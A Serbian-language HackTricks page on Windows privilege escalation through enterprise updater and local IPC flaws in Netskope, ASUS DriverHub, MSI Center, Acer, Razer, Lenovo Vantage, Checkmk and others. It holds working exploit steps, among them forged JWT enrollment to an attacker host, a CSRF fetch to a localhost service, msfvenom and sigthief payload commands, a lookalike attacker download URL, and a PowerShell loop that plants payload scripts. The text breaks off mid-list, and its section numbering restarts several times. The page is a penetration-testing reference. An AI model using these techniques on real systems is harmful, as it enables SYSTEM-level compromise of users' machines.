# Zloupotreba enterprise auto-updatera i privilegovanog IPC-a (npr. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopštava klasu Windows lanaca za lokalno podizanje privilegija pronađenih u enterprise agentima za krajnje uređaje i alatima za ažuriranje koji izlažu lako dostupnu IPC površinu i privilegovani tok ažuriranja. Reprezentativni primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da usmeri upisivanje na server pod kontrolom napadača, a zatim isporuči zlonamerni MSI koji SYSTEM servis instalira.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete primeniti na slične proizvode:
- Zloupotrebite localhost IPC privilegovanog servisa da biste primorali ponovno upisivanje ili rekonfiguraciju ka serveru napadača.
- Implementirajte vendorove update endpoint-e, isporučite lažni Trusted Root CA i usmerite updater ka zlonamernom „potpisanom” paketu.
- Zaobiđite slabe provere potpisnika (CN allow-lists), opcione digest zastavice i popustljiva MSI svojstva.
- Ako je IPC „šifrovan”, izvedite ključ/IV iz identifikatora mašine čitljivih svima, a sačuvanih u registru.
- Ako servis ograničava pozivaoce prema putanji izvršne datoteke/nazivu procesa, ubacite kod u proces sa allow-list-e ili pokrenite takav proces suspendovan, pa pokrenite svoju DLL datoteku minimalnom izmenom konteksta niti.

Posebnu proveru identiteta i granica ulaza treba obaviti i kod prilagođenih lokalnih TCP servisa, čak i kada zahtevaju PIN ili druge akreditive aplikacije. Utvrdite koji proces i efektivni servisni nalog koriste listener, a zatim proverite tačno instaliranu binarnu datoteku/verziju i da li se polja pod kontrolom pozivaoca proveravaju po dužini pre kopiranja u bafer fiksne veličine ili upotrebe za sastavljanje komande child procesa. [Microsoft-ove smernice za prekoračenje bafera](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) objašnjavaju zašto su neprovereni spoljni ulazi opasni u privilegovanom native kodu. Loopback listener, hardkodovani akreditiv ili sam naziv procesa ne dokazuju postojanje korupcije memorije niti izvršavanje pod SYSTEM nalogom; dostupnost, autorizacija, putanja izvršavanja koda i mere zaštite ostaju zasebni uslovi. Rutinsko nabrajanje treba da ostane pasivno, umesto da se servisu uživo šalju ulazi dužine koja može izazvati pad.

---
## 1) Prisiljavanje upisa na server napadača putem localhost IPC-a

Mnogi agenti isporučuju UI proces u korisničkom režimu koji komunicira sa SYSTEM servisom putem localhost TCP-a koristeći JSON.

Uočeno u Netskope:
- UI: stAgentUI (nizak nivo integriteta) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Tok eksploatacije:
1) Napravite JWT token za upisivanje čije tvrdnje određuju backend host (npr. AddonUrl). Koristite alg=None da potpis ne bi bio potreban.
2) Pošaljite IPC poruku kojom se poziva provisioning komanda uz vaš JWT i naziv tenant-a:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis počinje da šalje zahteve vašem rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako se provera pozivaoca zasniva na putanji/imenu, pošaljite zahtev iz allow-listed binarnog fajla vendora (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

### Network-exposed management IPC

Ova granica poverenja nije uvek ograničena na localhost. U prijavljenom slučaju MyReport Updater 2.1.1, servis `LocalSystem` slušao je na svim interfejsima i prihvatao neautentifikovanu gRPC promenu konfiguracije za referentni host, port i režim rada. Za udaljenu varijantu bili su neophodni i mrežni pristup listener-u i izlazni pristup servisa do izabranog referentnog hosta. Procenu ovih uslova obavite odvojeno od procene da li kasniji tok paketa može da pređe granicu za upisivanje fajlova.<sup>[[16]](#references)</sup>

---
## 2) Otimanje update kanala radi pokretanja koda kao SYSTEM

Kada klijent počne da komunicira sa vašim serverom, implementirajte očekivane endpoint-e i usmerite ga ka MSI-ju napadača. Uobičajen redosled:

1) /v2/config/org/clientconfig → Vratite JSON konfiguraciju sa veoma kratkim intervalom updater-a, npr.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Vraća PEM CA certificate. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Prosleđuje metapodatke koji upućuju na zlonamerni MSI i lažnu verziju.

Zaobilaženje uobičajenih provera koje se sreću u praksi:
- Allow-list za signer CN: servis možda proverava samo da li je Subject CN jednak „netSkope Inc” ili „Netskope, Inc.”. Vaš rogue CA može da izda leaf certificate sa tim CN-om i potpiše MSI.
- Svojstvo CERT_DIGEST: uključite bezopasno MSI svojstvo pod nazivom CERT_DIGEST. Pri instalaciji se ne sprovodi provera.
- Opcionalna provera digest-a: konfiguraciona zastavica (npr. check_msi_digest=false) isključuje dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira vaš MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Pouka o zaobilaženju zakrpe: ako dobavljač kao odgovor napravi allow-list sa malim skupom „pouzdanih” domena umesto da kriptografski autentifikuje izvor ažuriranja, potražite preusmerivače ili reverse proxy-je u vlasništvu dobavljača koji vam i dalje omogućavaju da usmeravate saobraćaj. U slučaju Netskope-a, javno objavljeno naknadno istraživanje pokazalo je da je allow-list iz R129 ere i dalje mogao da se zloupotrebi preko `rproxy.goskope.com`, koji je proksiovao sadržaj sa Azure App Service resursa pod kontrolom napadača. Allow-list hostova posmatrajte kao prepreku koju je lako preskočiti, a ne kao granicu poverenja.<sup>[[14]](#references)</sup>

Drugi način otkaza je **samokonzistentni, ali neautentifikovani metapodaci paketa**. U slučaju MyReport-a, referenca pod kontrolom napadača posluživala je izmenjenu arhivu, dok je posrednik menjao odgovore dobavljača sa MD5 digest-om i veličinom pre nego što su stigli do updater-a. Poklapanje tih vrednosti proveravalo je konzistentnost odgovora, a ne njegovo poreklo od dobavljača; nije bila potrebna MD5 kolizija. Direktorijum za instalaciju koji je birao pozivalac zatim je pretvorio privilegovano raspakivanje u granicu za upisivanje datoteka. Dobijena primitiva za učitavanje DLL-a obrađena je u odeljku [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsifikovanje šifrovanih IPC zahteva (kada postoje)

Od R127, Netskope je obmotao IPC JSON u polje encryptData koje izgleda kao Base64. Reverzni inženjering je pokazao AES sa ključem/IV-om izvedenim iz vrednosti u registru koje može da čita svaki korisnik:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da reprodukuju šifrovanje i šalju validne šifrovane komande sa naloga običnog korisnika.<sup>[[1]](#references)[[2]](#references)</sup> Opšti savet: ako agent iznenada počne da „šifruje” svoj IPC, potražite ID-je uređaja, product GUID-ove i install ID-jeve u HKLM koji se koriste kao materijal.

---
## 4) Zaobilaženje allow-list-ova za IPC pozivaoca (provere putanje/naziva)

Neki servisi pokušavaju da autentifikuju peer tako što utvrđuju PID TCP veze i upoređuju putanju/naziv image-a sa allow-list-om binarnih datoteka dobavljača koje se nalaze u Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična načina zaobilaženja:
- DLL injection u dozvoljeni proces (npr. nsdiag.exe) i prosleđivanje IPC zahteva iz njega.
- Pokretanje dozvoljene binarne datoteke u suspendovanom stanju i pokretanje vašeg proxy DLL-a bez CreateRemoteThread (pogledajte §5), kako bi se zadovoljila pravila za zaštitu od neovlašćenih izmena koju sprovodi driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection koji je kompatibilan sa zaštitom od neovlašćenih izmena: suspendovan proces + NtContinue patch

Proizvodi često isporučuju minifilter/OB callbacks driver (npr. Stadrv) koji uklanja opasna prava sa handle-ova ka zaštićenim procesima:
- Proces: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava prava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) Pozovite CreateProcess za binarnu datoteku dobavljača sa CREATE_SUSPENDED.
2) Uzmite handle-ove koje vam je i dalje dozvoljeno da koristite: PROCESS_VM_WRITE | PROCESS_VM_OPERATION za proces i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako menjate kod na poznatom RIP-u).
3) Zamenite ntdll!NtContinue (ili drugi rani, garantovano mapirani thunk) malom stub funkcijom koja poziva LoadLibraryW za putanju do vašeg DLL-a, a zatim se vraća nazad.
4) Pozovite ResumeThread da biste pokrenuli stub unutar procesa i učitali vaš DLL.

Pošto niste koristili PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME na procesu koji je već bio zaštićen (vi ste ga kreirali), poštovano je pravilo driver-a.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktični alati
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje zlonamernog MSI-ja i posluživanje potrebnih endpoint-a: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je prilagođeni IPC klijent koji sastavlja proizvoljne IPC poruke (po želji AES-šifrovane) i uključuje injection u suspendovan proces kako bi slao poruke iz dozvoljene binarne datoteke.<sup>[[4]](#references)</sup>

## 7) Brzi workflow za trijažu nepoznatih updater/IPC površina

Kada se susretnete sa novim endpoint agent-om ili paketom „pomoćnih” alata za matičnu ploču, brzi workflow je obično dovoljan da utvrdite da li je reč o obećavajućoj meti za privesc:<sup>[[6]](#references)</sup>

1) Nabrojte loopback listenere i utvrdite koji vendor procesi ih koriste:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Izlistajte moguće imenovane cevi:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Prikupite podatke o rutiranju zasnovane na registru, koje koriste IPC serveri zasnovani na dodacima:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpre izdvojite nazive endpointa, JSON ključeve i ID-jeve komandi iz klijenta u korisničkom režimu. Upakovani Electron/.NET frontend-i često leak-uju celu šemu:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Potražite stvarni predikat poverenja, a ne samo putanju koda koja na kraju pokreće proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je pouzdan”, što omogućava kloniranje sertifikata ili druge trikove s lažnim potpisnikom.
- Provere podniza/sufiksa nad `Origin`, `Referer`, URL-ovima za preuzimanje, imenima procesa ili CN-ovima potpisnika nisu autentifikacija. `contains(".vendor.com")` je obično moguće iskoristiti uz domen nalik legitimnom, koji kontroliše napadač.
- Ako GUI sa niskim privilegijama odlučuje da je „datoteka pouzdana”, a SYSTEM broker samo koristi taj rezultat, patchovanje ili ponovna implementacija DLL-a/JS-a na strani klijenta često u potpunosti zaobilazi granicu (podeljena validacija u Razer stilu).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje izvršavanje sa te putanje, odmah testirajte TOCTOU prozore za zamenu i susedne plug-in module koji izlažu alternativne `ExecuteTask()` omotače sa slabijim proverama.<sup>[[6]](#references)</sup>

Za mete koje intenzivno koriste named pipe, PipeViewer je brz način da uočite slabe DACL-ove i pipe-ove dostupne sa udaljenih lokacija pre nego što počnete detaljno da reverzujete protokol.<sup>[[11]](#references)</sup>

Ako meta autentifikuje pozivaoce samo na osnovu PID-a, putanje do image-a ili imena procesa, smatrajte to preprekom koja samo usporava napad, a ne bezbednosnom granicom: često je dovoljno ubaciti kod u legitimni klijent ili uspostaviti vezu iz procesa sa dozvoljene liste da bi se zadovoljile provere servera. Konkretno za named pipe-ove, [ova stranica o impersonation-u klijenata i zloupotrebi pipe-ova](named-pipe-client-impersonation.md) detaljnije obrađuje ovu tehniku.

Kod privilegovanog **broker-a za čišćenje ili vraćanje podataka**, proverite granicu poverenja putanje, kao i ACL za pipe. Pozivalac sa nižim privilegijama možda može da izabere odredište za vraćanje podataka ili da preimenuje privremeno sačuvan backup artefakt u deljenom direktorijumu, čak i kada su izvršna datoteka servisa i njen instalacioni direktorijum zaštićeni. Posebno potvrdite da pozivalac može da dođe do komande za vraćanje podataka, da može da izmeni tačan privremeno sačuvan ulaz ili ime datoteke, da broker radi pod identitetom sa višim privilegijama i da njegova operacija vraćanja zaista upisuje podatke na izabranu zaštićenu putanju. Direktorijum za privremeno čuvanje u koji može da se upisuje ili pipe koji može da se čita sami po sebi ne dokazuju mogućnost proizvoljnog upisa sa privilegijama; mapiranje odredišta i ponašanje servisa treba proveriti pregledom koda ili kontrolisanim testiranjem. Nemojte pokretati nepoznatu komandu za čišćenje tokom pasivnog izviđanja jer može da obriše korisničke datoteke.

---
## 8) Modularni broker-i dodataka koji se autentifikuju isključivo potpisima dobavljača (obrazac Lenovo Vantage)

Novija varijanta koju vredi tražiti jeste **RPC broker sa potpisanim klijentom**: desktop proces Lenovo-a sa niskim privilegijama komunicira sa SYSTEM servisom, a servis prosleđuje JSON komande skupu dodataka opisanih u XML-u, smeštenih pod `%ProgramData%`. Kada se postigne izvršavanje koda **unutar bilo kog prihvaćenog potpisanog klijenta**, svaki ugovor sa `runas="system"` postaje deo vaše površine za napad.<sup>[[15]](#references)</sup>

Vredne primitive uočene u istraživanju Lenovo Vantage-a:
- **Poverenje u pozivaoca zato što ga je potpisao dobavljač**: istraživači su došli do autentifikovanog konteksta tako što su kopirali EXE koji je potpisao Lenovo u direktorijum sa dozvolom za upis, a zatim ispunili uslov za DLL side-load (`profapi.dll`), čime se omogućilo izvršavanje proizvoljnog koda unutar klijenta kome je servis već verovao.
- **Otkrivanje površine za napad vođeno manifestima**: dodatke deklarišu datoteke `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; više ugovora radi kao `SYSTEM`, pa se enumeracijom tih manifesta često brže otkrivaju stvarne privilegovane komande nego reverzovanjem samog brokera.
- **Greške po pojedinačnim komandama iza autentifikovanog kanala**: kada se uđe u pouzdanog klijenta, javno istraživanje je otkrilo path traversal + race condition greške u komandama za ažuriranje/instalaciju, zloupotrebu raw SQL-a u privilegovanim bazama podataka za podešavanja i provere putanja registra zasnovane na podnizovima koje su omogućavale upise izvan predviđenog hive-a.

Korisno izviđanje na meti:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktičan zaključak: kad god pomoćni paket izlaže broker koji najpre autentifikuje **proces pozivaoca**, a tek zatim prosleđuje zahteve desetinama komandi dodataka/plugin-ova, nemojte stati nakon zaobilaženja početne provere poverenja. Izvucite tabelu manifesta/ugovora i fuzz-ujte svaku privilegovanu komandu zasebno; autentifikovani kanal obično krije nekoliko grešaka u narednoj fazi.

---
## 1) CSRF iz browsera ka privilegovanim HTTP API-jima na localhost-u (ASUS DriverHub)

DriverHub isporučuje HTTP servis u user-mode-u (ADU.exe) na 127.0.0.1:53000 koji očekuje pozive iz browsera sa https://driverhub.asus.com. Provera origin-a jednostavno primenjuje `string_contains(".asus.com")` na zaglavlje Origin i na URL-ove za preuzimanje izložene preko `/asus/v1.0/*`. Zbog toga svaki host pod kontrolom napadača, poput `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje JavaScript zahteve koji menjaju stanje.<sup>[[6]](#references)</sup> Pogledajte [osnove CSRF-a](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne načine zaobilaženja.

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i na njemu postavite zlonamernu veb-stranicu.
2) Koristite `fetch` ili XHR za pozivanje privilegovane krajnje tačke (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje očekuje handler – upakovani frontend JS prikazuje šemu u nastavku.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Čak i PowerShell CLI prikazan u nastavku uspeva kada se zaglavlje Origin lažira tako da sadrži pouzdanu vrednost:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Svaka poseta sajtu napadača u pregledaču zato postaje lokalni CSRF sa jednim klikom (ili bez klika, putem `onload`) koji upravlja SYSTEM pomoćnim programom.

---
## 2) Nesigurna provera code-signing-a i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne datoteke navedene u JSON telu zahteva i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Provera URL-a za preuzimanje koristi istu logiku poređenja podniza, pa se prihvata `http://updates.asus.com.attacker.tld:8000/payload.exe`. Nakon preuzimanja, ADU.exe samo proverava da li PE sadrži potpis i da li se Subject string podudara sa ASUS-ovim — nema `WinVerifyTrust` ni provere lanca sertifikata.

Da biste naoružali ovaj tok:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov potpisivač u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na domenu koji liči na `.asus.com` i pokrenite UpdateApp putem prethodno opisanog CSRF-a u pregledaču.

Pošto su i filteri za Origin i URL zasnovani na podnizu, a provera potpisivača samo poredi stringove, DriverHub preuzima i izvršava binarnu datoteku napadača u svom povišenom kontekstu.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU u putanjama za kopiranje/izvršavanje programa za ažuriranje (MSI Center CMD_AutoUpdateSDK)

SYSTEM servis MSI Center-a izlaže TCP protokol u kojem je svaki okvir `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Osnovna komponenta (Component ID `0f 27 00 00`) sadrži `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov rukovalac:
1) Kopira navedenu izvršnu datoteku u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Proverava potpis putem `CS_CommonAPI.EX_CA::Verify` (subject sertifikata mora biti jednak “MICRO-STAR INTERNATIONAL CO., LTD.”, a `WinVerifyTrust` mora uspeti).
3) Kreira zakazani zadatak koji pokreće privremenu datoteku kao SYSTEM, uz argumente pod kontrolom napadača.

Kopirana datoteka nije zaključana između provere i `ExecuteTask()`. Napadač može da:
- Pošalje okvir A koji upućuje na legitimnu MSI-potpisanu binarnu datoteku (čime se garantuje prolazak provere potpisa i stavljanje zadatka u red čekanja).
- U trci šalje ponovljene poruke okvira B koje upućuju na zlonamerni payload i prepisuju `MSI Center SDK.exe` odmah nakon završetka provere.

Kada se aktivira planer, on izvršava prepisani payload kao SYSTEM, iako je proverio originalnu datoteku. Pouzdana eksploatacija koristi dve goroutine/niti koje neprestano šalju `CMD_AutoUpdateSDK` dok se ne pobedi TOCTOU trka.<sup>[[6]](#references)</sup>

---
## 2) Zloupotreba prilagođenog IPC-a na nivou SYSTEM-a i impersonation-a (MSI Center + Acer Control Centre)

### TCP skupovi komandi MSI Center-a
- Svaki plugin/DLL koji učita `MSI.CentralServer.exe` dobija Component ID sačuvan pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta okvira biraju tu komponentu, što napadačima omogućava da usmeravaju komande ka proizvoljnim modulima.
- Plugin-ovi mogu da definišu sopstvene pokretače zadataka. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` **bez provere potpisa** — svaki lokalni korisnik može da mu prosledi `C:\Users\<user>\Desktop\payload.exe` i pouzdano dobije izvršavanje kao SYSTEM.
- Snimanje loopback saobraćaja pomoću Wireshark-a ili instrumentacija .NET binarnih datoteka u dnSpy-ju brzo otkriva mapiranje komponenti na komande; prilagođeni Go/Python klijenti zatim mogu ponoviti cadre.<sup>[[6]](#references)</sup>

### Named pipe-ови i impersonation nivoi Acer Control Centre-a
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegova discretionary ACL dozvoljava udaljene klijente (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanjem ID-a komande `7` uz putanju do datoteke poziva se rutina servisa za pokretanje procesa.
- Klijentska biblioteka serijalizuje magični završni bajt (113) zajedno sa argumentima. Dinamička instrumentacija pomoću Frida/`TsDotNetLib` (pogledajte [Alati za reverzni inženjering i osnovne metode](../../reversing/reversing-tools-basic-methods/README.md) za savete o instrumentaciji) pokazuje da nativni rukovalac mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre poziva `CreateProcessAsUser`.
- Zamena vrednosti 113 (`0x71`) sa 114 (`0x72`) preusmerava izvršavanje u generičku granu koja zadržava ceo SYSTEM token i postavlja SID visokog integriteta (`S-1-16-12288`). Pokrenuta binarna datoteka zato radi kao neograničeni SYSTEM, lokalno i preko mreže na drugoj mašini.
- Kombinujte ovo sa izloženom zastavicom instalacionog programa (`Setup.exe -nocheck`) da biste pokrenuli ACC čak i na laboratorijskim VM-ovima i testirali pipe bez hardvera proizvođača.<sup>[[6]](#references)</sup>

Ove IPC ranjivosti pokazuju zašto localhost servisi moraju da sprovode međusobnu autentifikaciju (ALPC SID-ovi, filteri `ImpersonationLevel=Impersonation`, filtriranje tokena) i zašto svaki pomoćni program u modulu za „pokretanje proizvoljne binarne datoteke” mora da koristi iste provere potpisivača.

---
## 3) COM/IPC „elevator” pomoćni programi zasnovani na slaboj validaciji u korisničkom režimu (Razer Synapse 4)

Razer Synapse 4 dodao je još jedan koristan obrazac u ovu grupu: korisnik sa niskim privilegijama može da zatraži od COM pomoćnog programa da pokrene proces preko `RzUtility.Elevator`, dok se odluka o poverenju prepušta DLL-u u korisničkom režimu (`simple_service.dll`), umesto da se pouzdano sprovodi unutar privilegovane granice.

Uočeni tok eksploatacije:
- Instancirajte COM objekat `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da biste zatražili pokretanje sa povišenim privilegijama.
- U javnom PoC-u, provera PE potpisa unutar `simple_service.dll` zakrpljena je tako da se preskoči pre slanja zahteva, čime se omogućava pokretanje proizvoljne izvršne datoteke koju je izabrao napadač.<sup>[[6]](#references)[[10]](#references)</sup>

Minimalni PowerShell poziv:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Opšti zaključak: pri reverznom inženjeringu „helper” paketa nemojte se zaustaviti na localhost TCP ili named pipes. Proverite COM klase sa imenima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privilegovana usluga zaista proverava ciljnu binarnu datoteku ili samo veruje rezultatu koji izračunava izmenjiva user-mode client DLL biblioteka. Ovaj obrazac nije specifičan za Razer: svaki podeljeni dizajn u kojem broker sa visokim privilegijama prihvata odluku o dozvoli/odbijanju sa strane sa niskim privilegijama predstavlja potencijalnu površinu za privesc.


---
## Predvidljivo izvršavanje privremene skripte tokom MSI popravke (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje izvršavaju privilegovane radnje tako što upisuju privremenu `.cmd` datoteku u `C:\Windows\Temp`, a zatim je pokreću kao `SYSTEM`. Ako je naziv datoteke predvidljiv, a usluga ne kreira bezbedno datoteke koje već postoje, korisnik sa niskim privilegijama može unapred da kreira buduću privremenu datoteku kao **read-only** i navede privilegovani proces da izvrši sadržaj koji kontroliše napadač, umesto sopstvene skripte.

Uočeno u ranjivim verzijama Checkmk Agent-a:
- obrazac privremene datoteke: `cmk_all_<PID>_1.cmd`
- pogođene grane: `2.0.0`, `2.1.0`, `2.2.0`
- okidač: MSI **repair** keširanog paketa agenta<sup>[[8]](#references)[[9]](#references)</sup>

Praktičan postupak:
1. Procenite realističan raspon PID-ova na osnovu trenutnih ID-jeva procesa ili PID-a pokrenutog agenta.
2. Zapišite kratak **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ili preusmeravanje iz `cmd.exe`; izbegavajte UTF-16 PowerShell izlaz za batch datoteke).
3. Kreirajte datoteke `C:\Windows\Temp\cmk_all_<PID>_1.cmd` za ceo ciljni raspon i označite svaku kao read-only.
4. Pokrenite repair keširanog MSI-ja kako bi privilegovana usluga pokušala ponovo da kreira privremenu skriptu, a zatim je izvršila.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, utvrdite kom proizvodu pripada nasumično nazvani keširani MSI u `C:\Windows\Installer` pre nego što pokrenete popravku:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operativne napomene:
- `qwinsta` je korisna kada `msiexec /fa` ne uspe iz neinteraktivne WinRM ljuske i treba da utvrdite da li postojeća desktop/disconnected sesija može ispravno da pokrene popravku.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge endpoint agente i update programe koji **postavljaju privremene skripte na lokacije sa dozvolom za pisanje za sve korisnike, a kasnije ih izvršavaju kao SYSTEM**. Proverite da li su imena predvidljiva, da li nedostaje semantika ekskluzivnog kreiranja i da li se tokovi popravke/ažuriranja mogu pokrenuti na zahtev.

### Popravka interaktivnog instalera i privilegovana konzola

PDF24 Creator 11.15.1 prikazuje zaseban rizik pri MSI popravci: prilagođena akcija za instalaciju štampača može tokom popravke da pokrene vidljivu konzolu sa SYSTEM pravima. Dobavljač je izmenio MSI installer u verziji 11.15.2 da bi rešio ovo ponašanje. Starija verzija proizvoda samo je početna tačka za trijažu. Proverite registrovani ili dostupni MSI paket, da li ovaj korisnik može da pokrene popravku, da li su prisutni ranjiva prilagođena akcija i kašnjenje u log fajlu, kao i da li interaktivni desktop može da prikaže konzolu. Prijavljeno kašnjenje koristilo je oplock na `faxPrnInst.log`; obična dozvola za pisanje u fajl nije jedini uslov pristupa. Neinteraktivna ljuska, nedostupan paket ili zakrpljeni installer mogu prekinuti ovaj lanac. Ovaj problem ne zavisi od `AlwaysInstallElevated` i razlikuje se od zamene predvidljive privremene skripte.

---
## Daljinska otmica lanca snabdevanja preko slabe provere updatera (WinGUp / Notepad++)

Između juna 2025. i decembra 2025. napadači koji su kompromitovali hosting infrastrukturu iza Notepad++ update toka selektivno su slali zlonamerne manifeste odabranim žrtvama. Stariji updatери zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost ažuriranja, pa je zlonameran XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto klijent prihvata HTTPS sadržaj bez provere pouzdanog lanca sertifikata i važećeg PE potpisa preuzetog instalera, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (nije potreban lokalni exploit):
1. **Presretanje infrastrukture**: kompromitujte CDN/hosting i odgovorite na provere ažuriranja metapodacima napadača koji upućuju na zlonameran URL za preuzimanje.
2. **Trojanizovani NSIS**: installer preuzima/izvršava payload i zloupotrebljava dva lanca izvršavanja:
